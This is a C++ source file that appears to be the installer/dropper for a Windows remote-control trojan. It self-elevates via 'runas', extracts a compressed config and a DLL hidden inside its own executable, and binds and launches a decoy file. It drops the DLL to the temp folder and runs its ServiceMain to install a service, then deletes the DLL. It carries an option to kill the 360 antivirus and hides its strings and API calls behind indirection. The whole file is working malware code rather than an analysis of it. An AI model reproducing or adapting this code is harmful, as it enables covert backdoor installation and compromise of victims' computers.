// PcStart.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "PcStart.h"
#include "Lzw.h"
#include "MainFrm.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

typedef void (WINAPI* SERVICEMAINPCMAKE)(ULONG, LPTSTR*);
typedef void (WINAPI* SERVICEMAINPCMAIN)(HWND hwnd, HINSTANCE hinst, char* sCmdLines, int nCmdShow);

CMyFunc	  m_gFunc;
UINT	  m_Ext_A[3] = {PS_EXT_A, PS_EXT_B, PS_EXT_C};
HINSTANCE m_ghInstance = NULL;

//更新的标识
ULONGLONG	m_UpdataInfo[3] = {PS_UPDATA_FLAG, 0x00, 0x00};

/////////////////////////////////////////////////////////////////////////////
// CPcStartApp

BEGIN_MESSAGE_MAP(CPcStartApp, CWinApp)
	//{{AFX_MSG_MAP(CPcStartApp)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
	// Standard file based document commands
	// Standard print setup command
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPcStartApp construction

CPcStartApp::CPcStartApp()
{
	
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CPcStartApp object

CPcStartApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CPcStartApp initialization

BOOL CPcStartApp::InitInstance()
{
	m_ghInstance = m_hInstance;
	if(!m_gFunc.LoadMyData((BYTE*) m_hInstance))
	{
		return FALSE;
	}
	CMainFrame* pFrame = new CMainFrame;
	m_pMainWnd = pFrame;
	pFrame->Create(NULL, "");

#ifndef PS_VER_DINGZUO
	m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) WorkThread, (LPVOID) ::AfxGetApp()->m_lpCmdLine, 0, NULL);
#endif

	return TRUE;
}

DWORD WorkThread(LPVOID lPvoid)
{
	DoWork((char*) lPvoid);
	m_gFunc.PostMessage(AfxGetMainWnd()->GetSafeHwnd(), WM_CLOSE, 0, 0);
	return 0;
}

Type IsShellSysType()
{
	Type ShellType = WindowsNT4;
	OSVERSIONINFO osvi = {0};
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	DWORD winVer = m_gFunc.GetVersion();
 	if(winVer < 0x80000000)
	{
		m_gFunc.GetVersionEx(&osvi);
		if(osvi.dwMajorVersion == 4L && osvi.dwMinorVersion == 0L)
		{
			ShellType = WindowsNT4;
		}
		else if(osvi.dwMajorVersion == 5L && osvi.dwMinorVersion == 0L)
		{
			ShellType = Windows2000;
		}
		else if(osvi.dwMajorVersion == 5L && osvi.dwMinorVersion == 1L)
		{
			ShellType = WindowsXP;
		}
		else if((osvi.dwMajorVersion == 5L && osvi.dwMinorVersion == 2L))
		{
			ShellType = Windows2003;
		}
		else if((osvi.dwMajorVersion == 6L && osvi.dwMinorVersion == 0L))
		{
			ShellType = Vista;
		}
		else if((osvi.dwMajorVersion == 6L && osvi.dwMinorVersion == 1L))
		{
			ShellType = Windows7;
		}
		else
		{
			ShellType = Windows8;
		}
	}
	else
	{
		ShellType = Windows98;
	}
	return ShellType;
}

#define _PCMAIN_

#ifdef _DEBUG
DWORD DoWork(LPCTSTR m_lpCmdLine)
{
	PSDLLINFO m_DllInfo = {0};
	ULONG nCmd = 0;
	strcpy(m_DllInfo.m_ServerAddr, "127.0.0.1");
	m_DllInfo.m_ServerPort = 80;
//	m_DllInfo.m_IsKeyMon = TRUE;
	strcpy(m_DllInfo.m_ServiceName, "asdasdss");
	strcpy(m_DllInfo.m_ServiceView, "asdasdss");
	strcpy(m_DllInfo.m_SoftVer, "测试版本[2010]");
	strcpy(m_DllInfo.m_ID, "0123546790123456");
	m_DllInfo.m_DelayTime = 2000;
	m_DllInfo.m_KillSoft = _KILL_360;

	char m_DllFilePath[256] = {0};
	GetModuleFileName(NULL, m_DllFilePath, 255);
	char* pFind = strrchr(m_DllFilePath, '\\');
	if(pFind != NULL)
	{
	#ifdef _PCMAIN_
		nCmd = DLL_START_PCMAIN;
		strcpy(pFind, "\\pcmain.dll");
	#else
		nCmd = DLL_START_PCMAKE;
		strcpy(pFind, "\\pcmake.dll");
	#endif
	}

	LPVOID pInDll[3] = {0};
	pInDll[0] = (LPVOID) &nCmd;
	pInDll[1] = (LPVOID) m_ghInstance;
	pInDll[2] = (LPVOID) &m_DllInfo;

	//取启动DLL
	HMODULE hDemonMoudle = LoadLibrary(m_DllFilePath);
	if(hDemonMoudle == NULL)
	{
		return 0;
	}

#ifdef _PCMAIN_
	SERVICEMAINPCMAIN ServiceMain = (SERVICEMAINPCMAIN) GetProcAddress(hDemonMoudle, "ServiceMain");
	if(ServiceMain != NULL)
	{
		ServiceMain((HWND) DLL_LOAD_FLAG, m_ghInstance, (char*) &m_DllInfo, DLL_LOAD_FLAG);
	}
#else
	SERVICEMAINPCMAKE ServiceMain = (SERVICEMAINPCMAKE) GetProcAddress(hDemonMoudle, "ServiceMain");
	if(ServiceMain != NULL)
	{
		ServiceMain(DLL_LOAD_FLAG, (char**) pInDll);
	}
#endif
	
	FreeLibrary(hDemonMoudle);
	return 0;
}
#else 
DWORD DoWork(LPCTSTR m_lpCmdLine)
{
	//取跟进字串
	char m_InCmdLines[256] = {0};
	m_gFunc.strcpy(m_InCmdLines, m_lpCmdLine);
	m_gFunc.CharLower(m_InCmdLines);

	Type m_SysTemType = IsShellSysType();
	if(m_SysTemType <= Windows2000)
	{
		//不支持的操作系统
		return 0;
	}

	if(m_gFunc.strlen(m_InCmdLines) == 0)
	{
		if(m_SysTemType == Vista || m_SysTemType == Windows7)
		{
			SHELLEXECUTEINFOW m_ExecInfo = {0};

			char m_AFileName[256] = {0};
			WCHAR m_WFileName[256] = {0};
			m_gFunc.GetModuleFileName(NULL, m_AFileName, 255);
			m_gFunc.MultiByteToWideChar(CP_ACP, 0, m_AFileName, m_gFunc.strlen(m_AFileName), m_WFileName, 255);

			WCHAR wlpVerb[256] = {0};
			
			//runas
			char clpVerb[256] = {0};
			m_gFunc.GetMyString(10201, clpVerb, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
			m_gFunc.MultiByteToWideChar(CP_ACP, 0, clpVerb, m_gFunc.strlen(clpVerb), wlpVerb, 255);

			WCHAR WlpParameters[256] = {0};

			//TWO
			char alpParameters[256] = {0};
			m_gFunc.GetMyString(10200, alpParameters, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
			m_gFunc.MultiByteToWideChar(CP_ACP, 0, alpParameters, m_gFunc.strlen(alpParameters), WlpParameters, 255);
			m_ExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
			m_ExecInfo.lpFile = m_WFileName;
			m_ExecInfo.lpVerb = wlpVerb;
			m_ExecInfo.nShow = SW_SHOW;
			m_ExecInfo.lpParameters = WlpParameters;
	
			m_gFunc.ShellExecuteExW(&m_ExecInfo);
			return 0;
		}
	}
	else
	{
		//two
		char m_TmpStr[256] = {0};
		m_gFunc.GetMyString(10200, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
		m_gFunc.CharLower(m_TmpStr);
		if(m_gFunc.strcmp(m_InCmdLines, m_TmpStr) != 0)
		{
			//文件捆绑
			BYTE* pModuel = (BYTE*) m_ghInstance;
			DWORD dwPE_Header_OffSet = *(DWORD *)(pModuel + 0x3C);
			IMAGE_NT_HEADERS *pPE_Header = (IMAGE_NT_HEADERS *)(pModuel + dwPE_Header_OffSet);

			//取字串资源偏移量
			LPPSSAVEFILEINFO pSaveFileInfo = NULL;
			for(DWORD i = 0; i < pPE_Header->OptionalHeader.SizeOfImage - sizeof(ULONGLONG); i++)
			{
				if(*((ULONGLONG*) &pModuel[i]) == PS_FIND_FLAG)
				{	
					pSaveFileInfo = (LPPSSAVEFILEINFO) &pModuel[i];
					break;
				}
			}
			if(pSaveFileInfo == NULL)
			{
				return 0;
			}

			//数据起始位置
			BYTE* pModuleSaveData = ((BYTE*) pSaveFileInfo) + pSaveFileInfo->m_StringLen + sizeof(PSSAVEFILEINFO) +
				pSaveFileInfo->m_InfoLen + pSaveFileInfo->m_DllFileLen + pSaveFileInfo->m_SysFileLen;

			DWORD nSrcComDataLen = 0;
			BYTE* pComFileData = NULL;
			FCLzw lzw;
			lzw.PcUnZip(pModuleSaveData, &pComFileData, &nSrcComDataLen);

			//修改原始文件
			while(1)
			{
				if(WriteMyFile(m_lpCmdLine, pComFileData, nSrcComDataLen))
				{
					break;
				}
				m_gFunc.Sleep(50);
			}
			delete [] pComFileData;
			m_gFunc.ShellExecute(NULL, NULL, m_lpCmdLine, NULL, NULL, SW_SHOW);
			return 0;
		}
	}

	//保存数据的指针
	BYTE* pModuel = (BYTE*) m_ghInstance;
	DWORD dwPE_Header_OffSet = *(DWORD *)(pModuel + 0x3C);
	IMAGE_NT_HEADERS *pPE_Header = (IMAGE_NT_HEADERS *)(pModuel + dwPE_Header_OffSet);

	//取字串资源偏移量
	LPPSSAVEFILEINFO pSaveFileInfo = NULL;
	for(DWORD i = 0; i < pPE_Header->OptionalHeader.SizeOfImage - sizeof(ULONGLONG); i++)
	{
		if(*((ULONGLONG*) &pModuel[i]) == PS_FIND_FLAG)
		{	
			pSaveFileInfo = (LPPSSAVEFILEINFO) &pModuel[i];
			break;
		}
	}
	if(pSaveFileInfo == NULL)
	{
		return 0;
	}

	//数据起始位置
	BYTE* pModuleSaveData = ((BYTE*) pSaveFileInfo) + pSaveFileInfo->m_StringLen + sizeof(PSSAVEFILEINFO);
	
	PSDLLINFO m_DllInfo = {0};
	FCLzw lzw;

	//配置信息数据
	DWORD nSrcInfoDataLen = 0;
	BYTE* pSrcInfoData = NULL;
	lzw.PcUnZip(pModuleSaveData, &pSrcInfoData, &nSrcInfoDataLen);
	m_gFunc.memcpy(&m_DllInfo, pSrcInfoData, nSrcInfoDataLen);
	delete [] pSrcInfoData;
	pModuleSaveData += pSaveFileInfo->m_InfoLen;

	//查看是否有文件捆绑
	if(m_DllInfo.m_ComFileLen > 0)
	{
		//%scom.exe
		char m_TmpStr[256] = {0};
		m_gFunc.GetMyString(10202, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
		char m_TmpFilePath[256] = {0};
		m_gFunc.GetTempPath(250, m_TmpFilePath);
		m_gFunc.sprintf(m_TmpFilePath + m_gFunc.strlen(m_TmpFilePath), m_TmpStr, m_DllInfo.m_ServiceName);
		
		//原始文件
		char m_ExeFileName[256] = {0};
		m_gFunc.GetModuleFileName(NULL, m_ExeFileName, 255);
		if(m_gFunc.CopyFile(m_ExeFileName, m_TmpFilePath, FALSE))
		{
			m_gFunc.ShellExecute(NULL, NULL, m_TmpFilePath, m_ExeFileName, NULL, SW_SHOW);
		}
	}

	if(m_UpdataInfo[1] != 0 || m_UpdataInfo[2] != 0)
	{
		//备份前一个唯一标识
		m_gFunc.memcpy(m_DllInfo.m_ID, &m_UpdataInfo[1], 16);
	}

	//DLL文件数据
	DWORD nSrcDllDataLen = 0;
	BYTE* pDllFileData = NULL;
	lzw.PcUnZip(pModuleSaveData, &pDllFileData, &nSrcDllDataLen);
	pModuleSaveData += pSaveFileInfo->m_DllFileLen;

	//保存dll文件到临时目录
	char m_DllFilePath[256] = {0};
	m_gFunc.GetTempPath(250, m_DllFilePath);

	//%s.dll
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10199, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.sprintf(m_DllFilePath + m_gFunc.strlen(m_DllFilePath), m_TmpStr, m_DllInfo.m_ServiceName);
	WriteMyFile(m_DllFilePath, pDllFileData, nSrcDllDataLen);
	delete [] pDllFileData;

	DWORD nCmd = DLL_START_INSTALL;
	LPVOID pInDll[3] = {0};
	pInDll[0] = (LPVOID) &nCmd;
	pInDll[1] = (LPVOID) m_ghInstance;
	pInDll[2] = (LPVOID) &m_DllInfo;

	//取启动DLL
	HMODULE hDemonMoudle = LoadLibrary(m_DllFilePath);
	if(hDemonMoudle == NULL)
	{
		return 0;
	}

	//ServiceMain
	m_gFunc.GetMyString(10198, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	SERVICEMAINPCMAKE ServiceMain = (SERVICEMAINPCMAKE) GetProcAddress(hDemonMoudle, m_TmpStr);
	if(ServiceMain != NULL)
	{
		ServiceMain(DLL_LOAD_FLAG, (char**) pInDll);
	}
	FreeLibrary(hDemonMoudle);

	//删除临时DLL文件
	m_gFunc.DeleteFile(m_DllFilePath);
	return 0;
}
#endif

BOOL WriteMyFile(LPCTSTR m_FileName, LPVOID pData, DWORD nLen)
{
	HANDLE hFile = m_gFunc.CreateFile(m_FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nWriteLen = 0;
	m_gFunc.WriteFile(hFile, pData, nLen, &nWriteLen, NULL);
	m_gFunc.CloseHandle(hFile);
	return TRUE;
}




